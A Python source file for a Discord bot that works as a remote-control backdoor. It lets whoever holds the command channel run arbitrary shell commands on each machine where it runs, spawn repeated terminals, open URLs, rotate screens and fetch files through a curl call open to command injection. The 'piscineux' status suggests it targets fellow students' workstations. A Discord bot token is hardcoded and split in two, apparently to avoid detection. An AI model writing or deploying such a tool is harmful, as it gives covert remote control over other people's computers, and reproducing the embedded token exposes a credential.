import asyncio
import socket
import discord
import subprocess
import time
from discord.ext import commands

ID = socket.gethostname().split('.')[0]
intents = discord.Intents.all()
client = commands.Bot(command_prefix=">",
					  status=discord.Status.online,
					  intents=intents,
					  activity=discord.Activity(type=discord.ActivityType.listening, name=f"les piscineux"),
					  )


@client.event
async def on_ready():
	print("Starting !")
	channel = client.get_channel(1361783071535267880)
	if channel:
		await channel.send(f"✅ `[{ID}] ACTIVATED !`")
	else:
		print("Channel not found!")

@client.command()
async def ping(ctx, who):
	if (who == ID or who == "everyone"):
		await ctx.send(f"✅ `[{ID}]` -> `{client.latency}`")
	else:
		pass

@client.command()
async def screen(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			if (command in ["inverted", "normal", "right", "left"]):
				subprocess.run(['xrandr', '--output', 'eDP', '--rotate', f"{command}"], check=True)
			else:
				await ctx.send(f"`[{ID}] invalid parameter : {command}`")
				return
			await ctx.send(f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def firefox(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			subprocess.run(['firefox', '--new-tab', f'{command}'], check=True)
			await ctx.send(f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def img(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			subprocess.run(f'curl "{command}" -o img.jpg', shell=True, check=True)
			subprocess.run(['xdg-open', 'img.jpg'], check=True)
			await ctx.send(f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def shell_loop(ctx, who, number: int, *command):
	if (who == ID or who == "everyone"):
		try:
			for i in range(number):
				subprocess.Popen(['xterm', '-geometry', '50x20', '-fa', 'Monospace', '-fs', '18' ,'-e', f"{' '.join(command)}"])
			await ctx.send(f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def shell(ctx, who, *command):
	if (who == ID or who == "everyone"):
		try:
			subprocess.Popen(['xterm', '-geometry', '50x20', '-fa', 'Monospace', '-fs', '18' ,'-e', f"{' '.join(command)}"])
			await ctx.send(f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def exit(ctx, who):
	if (who == ID or who == "everyone"):
		try:
			await ctx.send(f"`[{ID}] is exiting !`")
			channel = client.get_channel(1361783071535267880)
			if channel:
				await channel.send(f"❌ `[{ID}] DEACTIVATED !`")
			else:
				print("Channel not found!")
			await client.close()
		except Exception as e:
			await ctx.send(f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

p2 = ".8pGM_ULYbbDcv-o6Ov0NXy2hTXYImHZxELavBM"

async def main():
	async with client:
		await client.start("MTM2MTc4MTk4NTY2NzcxMTAzNw.GJoN_x" + p2)

try:
	asyncio.run(main())
except KeyboardInterrupt:
	print("\nBOT STOP")
except:
	pass
